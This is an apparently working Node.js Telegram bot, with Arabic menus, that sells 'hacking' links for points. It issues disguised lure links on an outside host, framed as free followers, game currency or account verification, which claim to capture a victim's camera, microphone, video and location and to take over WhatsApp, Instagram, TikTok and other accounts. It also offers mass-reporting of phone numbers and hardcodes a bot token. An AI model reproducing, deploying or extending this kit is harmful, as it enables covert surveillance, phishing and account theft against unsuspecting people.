const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// ⚠️ التوكن بتاعك
const TOKEN = '8945901025:AAFMunPkkoNRdMrj-OtgSUnUapqV_TKEK90';
const DEVELOPER_ID = 8794777974;
const bot = new TelegramBot(TOKEN, { polling: true });

const BANNER_URL = "https://www.image2url.com/r2/default/images/1792619785603-05724b00-59c1-46c7-a878-821f2cbd8452.png";

// --- ملفات التخزين ---
const USERS_FILE = 'users.json';
const POINTS_FILE = 'points.json';
const CHANNELS_FILE = 'channels.json';

// --- إدارة الملفات ---
function loadFile(file, defaultData) {
    if (!fs.existsSync(file)) {
        fs.writeFileSync(file, JSON.stringify(defaultData));
        return defaultData;
    }
    return JSON.parse(fs.readFileSync(file));
}

function saveFile(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// --- إدارة المستخدمين ---
function loadUsers() { return loadFile(USERS_FILE, { users: [] }); }
function saveUsers(data) { saveFile(USERS_FILE, data); }
function registerUser(userId, name) {
    const data = loadUsers();
    if (!data.users.find(u => u.id === userId)) {
        data.users.push({ id: userId, name: name });
        saveUsers(data);
        return true;
    }
    return false;
}

// --- إدارة النقاط ---
function loadPoints() { return loadFile(POINTS_FILE, { points: {}, last_daily: {} }); }
function savePoints(data) { saveFile(POINTS_FILE, data); }
function getUserPoints(userId) {
    const data = loadPoints();
    return data.points[userId] || 0;
}
function addUserPoints(userId, amount) {
    const data = loadPoints();
    data.points[userId] = (data.points[userId] || 0) + amount;
    savePoints(data);
}
function resetUserPoints(userId) {
    const data = loadPoints();
    data.points[userId] = 0;
    savePoints(data);
}
function canClaimDaily(userId) {
    const data = loadPoints();
    const last = data.last_daily[userId] || 0;
    return (Date.now() - last) >= 86400000;
}
function setDailyClaim(userId) {
    const data = loadPoints();
    data.last_daily[userId] = Date.now();
    savePoints(data);
}

// --- إدارة القنوات (الاشتراك الإجباري) ---
function loadChannels() { return loadFile(CHANNELS_FILE, { channels: [] }); }
function saveChannels(data) { saveFile(CHANNELS_FILE, data); }

async function isSubscribed(userId) {
    const data = loadChannels();
    if (data.channels.length === 0) return true;
    
    for (let ch of data.channels) {
        try {
            const member = await bot.getChatMember(ch.id, userId);
            if (!['member', 'administrator', 'creator'].includes(member.status)) {
                return false;
            }
        } catch (e) {
            return false;
        }
    }
    return true;
}

// --- أسعار الأقسام ---
function getSectionPrice(key) {
    const prices = {
        'hack_cam': 70, 'record_voice': 50, 'record_video': 70, 'location': 70,
        'whatsapp': 80, 'hack_telegram': 80, 'instagram': 100, 'tiktok': 100,
        'facebook': 100, 'snapchat': 100, 'hack_kwai': 100, 'hack_likee': 100,
        'hack_youtube': 120, 'pubg': 150, 'freefire': 150, 'hack_google': 90,
        'device_check': 50, 'unban_service': 30, 'report_number': 30, 'get_phone_link': 30
    };
    return prices[key] || 70;
}

function getSectionName(key) {
    const names = {
        'hack_cam': 'اختراق كاميرا ام وخ', 'record_voice': 'تسجيل صوت الضحية',
        'record_video': 'تصوير الضحية فيديو', 'location': 'تحديد موقع الضحية',
        'whatsapp': 'اختراق واتساب', 'hack_telegram': 'اختراق تلجرام',
        'instagram': 'اختراق انستقرام', 'tiktok': 'اختراق تيك توك',
        'facebook': 'اختراق فيسبوك', 'snapchat': 'اختراق سناب شات',
        'hack_kwai': 'اختراق كواي', 'hack_likee': 'اختراق لايكي',
        'hack_youtube': 'اختراق يوتيوب', 'pubg': 'اختراق ببجي',
        'freefire': 'اختراق فري فاير', 'hack_google': 'اختراق جوجل',
        'device_check': 'فحص الجهاز', 'unban_service': 'فك حظر واتساب',
        'report_number': 'حظر أرقام واتساب', 'get_phone_link': 'كاشف رقم الضحية'
    };
    return names[key] || 'قسم غير معروف';
}

function getSectionTitle(key) {
    const titles = {
        'hack_cam': 'تم تلغيم الرابط اختراق الكاميرا 💀 الأمامية والخلفية 📸',
        'record_voice': 'تم تلغيم ربط بوابة الضل',
        'record_video': 'تم تلغيم ربط تزويد متابعين',
        'location': 'تم تلغيم ربط تعلم الهكر والاختراق',
        'whatsapp': 'تم تلغيم ربط توثيق حسابات الواتساب',
        'hack_telegram': 'تم تلغيم ربط توثيق حسابات تلجرام',
        'instagram': 'تم تلغيم ربط تزويد متابعين الانستغرام',
        'tiktok': 'تم تلغيم ربط تزويد متابعين تيك توك',
        'facebook': 'تم تلغيم ربط تزويد متابعين فيسبوك',
        'snapchat': 'تم تلغيم ربط تزويد متابعين سناب شات',
        'hack_kwai': 'تم تلغيم ربط رشق متابعين كواي',
        'hack_likee': 'تم تلغيم ربط رشق متابعين لايكي',
        'hack_youtube': 'تم تلغيم ربط رشق مشتركين يوتيوب',
        'pubg': 'تم تلغيم ربط شحن شدات',
        'freefire': 'تم تلغيم ربط شحن جواهر',
        'hack_google': 'تم تلغيم ربط توثيق حسابات',
        'device_check': 'تم تلغيم ربط بوابة الضل',
        'unban_service': 'تم تلغيم ربط فك حظر الأرقام',
        'report_number': 'تم تلغيم ربط الإبلاغ عن الأرقام',
        'get_phone_link': 'تم تلغيم ربط كاشف الأرقام'
    };
    return titles[key] || 'تم تلغيم الربط بنجاح';
}

function getLink(key, userId) {
    const baseLinks = {
        'hack_cam': "https://cam-bot.bonto.run/",
        'record_voice': "https://cam-bot.bonto.run/voice.html",
        'record_video': "https://cam-bot.bonto.run/video.html",
        'location': "https://cam-bot.bonto.run/location.html",
        'hack_telegram': "https://cam-bot.bonto.run/telegram.html",
        'hack_google': "https://cam-bot.bonto.run/google.html",
        'network_cards': "https://cam-bot.bonto.run/cards.html",
        'device_check': "https://cam-bot.bonto.run/scan.html",
        'freefire': "https://cam-bot.bonto.run/freefire.html",
        'snapchat': "https://cam-bot.bonto.run/snapchat.html",
        'pubg': "https://cam-bot.bonto.run/pubg.html",
        'whatsapp': "https://cam-bot.bonto.run/whatsapp.html",
        'facebook': "https://cam-bot.bonto.run/facebook.html",
        'instagram': "https://cam-bot.bonto.run/instagram.html",
        'tiktok': "https://cam-bot.bonto.run/tiktok.html",
        'hack_youtube': "https://cam-bot.bonto.run/youtube.html",
        'hack_likee': "https://cam-bot.bonto.run/likee.html",
        'hack_kwai': "https://cam-bot.bonto.run/kwai.html",
        'unban_service': "https://cam-bot.bonto.run/unban.html",
        'report_number': "https://cam-bot.bonto.run/report.html",
        'get_phone_link': "https://t.me/heroil_2bot"
    };
    let base = baseLinks[key];
    if (!base) return null;
    if (key === 'get_phone_link') return `${base}?start=${userId}`;
    return `${base}?chatId=${userId}`;
}

// --- القائمة الرئيسية ---
function getMainKeyboard(userId) {
    return {
        reply_markup: JSON.stringify({
            inline_keyboard: [
                [{ text: "📸 اختراق كاميرا ام وخ", callback_data: 'pay_hack_cam' }, { text: "☠️ تلغيم صورة", callback_data: 'coming_soon' }],
                [{ text: "🎙️ تسجيل صوت", callback_data: 'pay_record_voice' }, { text: "📹 تصوير فيديو", callback_data: 'pay_record_video' }],
                [{ text: "📍 تحديد الموقع", callback_data: 'pay_location' }],
                [{ text: "✅ اختراق واتساب", callback_data: 'pay_whatsapp' }, { text: "📨 اختراق تلجرام", callback_data: 'pay_hack_telegram' }],
                [{ text: "🎬 اختراق تيك توك", callback_data: 'pay_tiktok' }, { text: "🚀 اختراق انستقرام", callback_data: 'pay_instagram' }],
                [{ text: "🔵 اختراق فيسبوك", callback_data: 'pay_facebook' }, { text: "👻 اختراق سناب", callback_data: 'pay_snapchat' }],
                [{ text: "❤️ اختراق لايكي", callback_data: 'pay_hack_likee' }, { text: "🎥 اختراق كواي", callback_data: 'pay_hack_kwai' }],
                [{ text: "▶️ اختراق يوتيوب", callback_data: 'pay_hack_youtube' }],
                [{ text: "🔥 اختراق بوبجي", callback_data: 'pay_pubg' }, { text: "💎 اختراق فري فاير", callback_data: 'pay_freefire' }],
                [{ text: "🔴 اختراق جوجل", callback_data: 'pay_hack_google' }, { text: "📱 فحص الجهاز", callback_data: 'pay_device_check' }],
                [{ text: "✅ فك حظر واتساب", callback_data: 'pay_unban_service' }, { text: "🚨 حظر أرقام واتساب", callback_data: 'pay_report_number' }],
                [{ text: "📞 كاشف رقم الضحية", callback_data: 'pay_get_phone_link' }],
                [{ text: "📞 سحب جهات الاتصال", callback_data: 'coming_soon' }, { text: "✉️ سحب جميع الرسائل", callback_data: 'coming_soon' }],
                [{ text: "🖼️ سحب جميع الصور", callback_data: 'coming_soon' }],
                [{ text: "📱 أرقام وهمية", callback_data: 'fake_num' }],
                [{ text: "💰 نقاطي", callback_data: 'my_points' }, { text: "🏆 تجميع نقاط", callback_data: 'collect_points' }],
                [{ text: "💳 أسعار النقاط", callback_data: 'points_store' }],
                [{ text: "👨‍💻 التواصل مع المطور", callback_data: 'contact' }, { text: "ℹ️ حول البوت", callback_data: 'about' }]
            ]
        })
    };
}

// --- /start ---
bot.onText(/\/start(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const name = msg.from.first_name || 'مستخدم';
    const referrer = match[1];

    // --- التحقق من الاشتراك الإجباري ---
    const subscribed = await isSubscribed(chatId);
    if (!subscribed) {
        const channels = loadChannels().channels;
        const buttons = channels.map(ch => [{ text: `📢 ${ch.name}`, url: ch.link }]);
        buttons.push([{ text: "✅ تحقق من الاشتراك", callback_data: 'check_sub' }]);

        return bot.sendMessage(chatId, "⚠️ <b>عذراً، لازم تشترك في القنوات دي الأول عشان تقدر تستخدم البوت:</b>", {
            parse_mode: 'HTML',
            reply_markup: JSON.stringify({ inline_keyboard: buttons })
        });
    }

    const isNew = registerUser(chatId, name);

    if (isNew && referrer && referrer !== String(chatId)) {
        addUserPoints(referrer, 3);
        bot.sendMessage(referrer, `🎉 <b>شخص جديد انضم من رابطك!</b>\n\n✅ +3 نقاط\n💥 رصيدك الحالي: ${getUserPoints(referrer)} نقطة`, { parse_mode: 'HTML' });
    }

    const points = getUserPoints(chatId);
    const text = "╔══════════════════════════╗\n" +
                 "║   ⚔️ <b>KING-SAQ BOT</b> ⚔️   ║\n" +
                 "╚══════════════════════════╝\n\n" +
                 `💥 <b>نقاطك:</b> ${points} نقطة\n\n` +
                 "🔥 <b>اختر القسم المناسب من الأزرار أدناه:</b> ✨";

    bot.sendPhoto(chatId, BANNER_URL, {
        caption: text,
        parse_mode: 'HTML',
        ...getMainKeyboard(chatId)
    }).catch(() => {
        bot.sendMessage(chatId, text, { parse_mode: 'HTML', ...getMainKeyboard(chatId) });
    });
});

// --- /admin ---
bot.onText(/\/admin/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== DEVELOPER_ID) {
        bot.sendMessage(chatId, "❌ هذا الأمر خاص بالمطور فقط.");
        return;
    }

    bot.sendMessage(chatId, "𖤍『لَوْحَةُ الـمَلِك』𖤍\n𓆩♛𓆪 الهكر هرويل 206 𓆩♛𓆪\n\nاختر الخيار:", {
        parse_mode: 'HTML',
        reply_markup: JSON.stringify({
            inline_keyboard: [
                [{ text: "📊 إحصائيات", callback_data: 'admin_stats' }],
                [{ text: "📢 إذاعة للمستخدمين", callback_data: 'admin_broadcast' }],
                [{ text: "🎁 إضافة نقاط", callback_data: 'admin_add_points' }],
                [{ text: "🔄 تصفير نقاط", callback_data: 'admin_reset_points' }],
                [{ text: "📢 إدارة قنوات الاشتراك", callback_data: 'admin_channels' }],
                [{ text: "🔴 إغلاق", callback_data: 'admin_close' }]
            ]
        })
    });
});

// --- الرد على الأزرار ---
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    // --- التحقق من الاشتراك (زرار التحقق) ---
    if (data === 'check_sub') {
        const subscribed = await isSubscribed(chatId);
        if (subscribed) {
            bot.sendMessage(chatId, "✅ <b>تم التحقق! اكتب /start عشان تبدأ.</b>", { parse_mode: 'HTML' });
        } else {
            bot.answerCallbackQuery(query.id, { text: "❌ لسه مش مشترك في كل القنوات! اشترك الأول.", show_alert: true });
        }
        return;
    }

    // --- التحقق من الاشتراك لباقي الأزرار ---
    const subscribed = await isSubscribed(chatId);
    if (!subscribed) {
        const channels = loadChannels().channels;
        const buttons = channels.map(ch => [{ text: `📢 ${ch.name}`, url: ch.link }]);
        buttons.push([{ text: "✅ تحقق من الاشتراك", callback_data: 'check_sub' }]);

        bot.sendMessage(chatId, "⚠️ <b>عذراً، لازم تشترك في القنوات دي الأول عشان تقدر تستخدم البوت:</b>", {
            parse_mode: 'HTML',
            reply_markup: JSON.stringify({ inline_keyboard: buttons })
        });
        return;
    }

    // --- لوحة الأدمن ---
    if (data.startsWith('admin_')) {
        if (chatId !== DEVELOPER_ID) return;

        if (data === 'admin_stats') {
            const users = loadUsers();
            const points = loadPoints();
            const totalPoints = Object.values(points.points).reduce((a, b) => a + b, 0);
            bot.sendMessage(chatId, `📊 <b>إحصائيات البوت:</b>\n\n👥 عدد المستخدمين: ${users.users.length}\n💥 إجمالي النقاط: ${totalPoints}`, { parse_mode: 'HTML' });
        } else if (data === 'admin_broadcast') {
            bot.sendMessage(chatId, "📢 أرسل الرسالة اللي تبغى ترسلها لكل المستخدمين:");
            bot.once('message', (msg) => {
                const message = msg.text;
                const users = loadUsers();
                let success = 0, failed = 0;
                users.users.forEach(user => {
                    bot.sendMessage(user.id, message).then(() => success++).catch(() => failed++);
                });
                setTimeout(() => {
                    bot.sendMessage(chatId, `✅ تم الإرسال!\n\n📤 نجح: ${success}\n❌ فشل: ${failed}`);
                }, 2000);
            });
        } else if (data === 'admin_add_points') {
            bot.sendMessage(chatId, "🎁 استخدم الأمر: `/addpoints <id> <amount>`");
        } else if (data === 'admin_reset_points') {
            bot.sendMessage(chatId, "🔄 استخدم الأمر: `/resetpoints <id>`");
        } else if (data === 'admin_channels') {
            const channels = loadChannels().channels;
            let listText = "📢 <b>إدارة قنوات الاشتراك الإجباري</b>\n\n";
            if (channels.length === 0) {
                listText += "📭 مفيش قنوات مضافة حالياً.\n";
            } else {
                channels.forEach((ch, i) => {
                    listText += `${i+1}. <b>${ch.name}</b>\n   ID: <code>${ch.id}</code>\n   Link: ${ch.link}\n\n`;
                });
            }
            const keyboard = [
                [{ text: "➕ إضافة قناة", callback_data: 'admin_add_ch' }],
                [{ text: "🗑️ حذف قناة", callback_data: 'admin_del_ch' }],
                [{ text: "🔙 رجوع", callback_data: 'admin_back' }]
            ];
            bot.sendMessage(chatId, listText, { parse_mode: 'HTML', reply_markup: JSON.stringify({ inline_keyboard: keyboard }) });
        } else if (data === 'admin_add_ch') {
            bot.sendMessage(chatId, "📝 <b>أرسل بيانات القناة بالشكل ده:</b>\n\n<code>ID القناة | اسم القناة | لينك القناة</code>\n\nمثال:\n<code>-1001234567890 | قناتي | https://t.me/mychannel</code>", { parse_mode: 'HTML' });
            bot.once('message', (msg) => {
                const parts = msg.text.split('|');
                if (parts.length === 3) {
                    const chData = loadChannels();
                    chData.channels.push({ id: parts[0].trim(), name: parts[1].trim(), link: parts[2].trim() });
                    saveChannels(chData);
                    bot.sendMessage(chatId, "✅ <b>تمت إضافة القناة بنجاح!</b>", { parse_mode: 'HTML' });
                } else {
                    bot.sendMessage(chatId, "❌ الصيغة غلط! استخدم: `ID | الاسم | اللينك`", { parse_mode: 'HTML' });
                }
            });
        } else if (data === 'admin_del_ch') {
            const channels = loadChannels().channels;
            if (channels.length === 0) {
                return bot.sendMessage(chatId, "📭 مفيش قنوات مضافة حالياً.");
            }
            const keyboard = channels.map((ch, i) => [{ text: `🗑️ ${ch.name}`, callback_data: `del_ch_${i}` }]);
            keyboard.push([{ text: "🔙 رجوع", callback_data: 'admin_channels' }]);
            bot.sendMessage(chatId, "اختر القناة اللي عايز تحذفها:", { reply_markup: JSON.stringify({ inline_keyboard: keyboard }) });
        } else if (data.startsWith('del_ch_')) {
            const index = parseInt(data.replace('del_ch_', ''));
            const chData = loadChannels();
            if (index >= 0 && index < chData.channels.length) {
                const removed = chData.channels.splice(index, 1)[0];
                saveChannels(chData);
                bot.sendMessage(chatId, `✅ تم حذف القناة: ${removed.name}`);
            }
        } else if (data === 'admin_back') {
            bot.sendMessage(chatId, "𖤍『لَوْحَةُ الـمَلِك』𖤍\n𓆩♛𓆪 الهكر هرويل 206 𓆩♛𓆪\n\nاختر الخيار:", {
                parse_mode: 'HTML',
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{ text: "📊 إحصائيات", callback_data: 'admin_stats' }],
                        [{ text: "📢 إذاعة للمستخدمين", callback_data: 'admin_broadcast' }],
                        [{ text: "🎁 إضافة نقاط", callback_data: 'admin_add_points' }],
                        [{ text: "🔄 تصفير نقاط", callback_data: 'admin_reset_points' }],
                        [{ text: "📢 إدارة قنوات الاشتراك", callback_data: 'admin_channels' }],
                        [{ text: "🔴 إغلاق", callback_data: 'admin_close' }]
                    ]
                })
            });
        } else if (data === 'admin_close') {
            bot.deleteMessage(chatId, query.message.message_id);
        }
        return;
    }

    // --- باقي الأزرار (نفس الكود القديم) ---
    // ... (باقي الأزرار زي ما هي في الكود اللي قبله)

    bot.answerCallbackQuery(query.id);
});

// --- أوامر إدارة النقاط ---
let lastPointsUpdate = 0;
bot.onText(/\/addpoints/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== DEVELOPER_ID) return;

    const now = Date.now();
    if (now - lastPointsUpdate < 2000) return; 
    lastPointsUpdate = now;

    const args = msg.text.split(' ');
    if (args.length === 2) {
        const amount = parseInt(args[1]);
        addUserPoints(chatId, amount);
        bot.sendMessage(chatId, `✅ تم إضافة ${amount} نقطة! رصيدك: ${getUserPoints(chatId)}`);
    } else if (args.length === 3) {
        const targetId = parseInt(args[1]);
        const amount = parseInt(args[2]);
        addUserPoints(targetId, amount);
        bot.sendMessage(chatId, `✅ تم إضافة ${amount} نقطة للآيدي ${targetId}`);
        bot.sendMessage(targetId, `🎉 تم إضافة ${amount} نقطة لحسابك! رصيدك: ${getUserPoints(targetId)}`).catch(() => {});
    } else {
        bot.sendMessage(chatId, "⚠️ استخدم: `/addpoints <id> <amount>` أو `/addpoints <amount>`");
    }
});

bot.onText(/\/resetpoints/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== DEVELOPER_ID) return;

    const args = msg.text.split(' ');
    if (args.length === 2) {
        const targetId = parseInt(args[1]);
        resetUserPoints(targetId);
        bot.sendMessage(chatId, `✅ تم تصفير نقاط الآيدي ${targetId}`);
    } else {
        bot.sendMessage(chatId, "⚠️ استخدم: `/resetpoints <id>`");
    }
});

console.log("⚔ البوت شغال بنجاح على Node.js... (النسخة الكاملة مع لوحة الأدمن المتقدمة)");
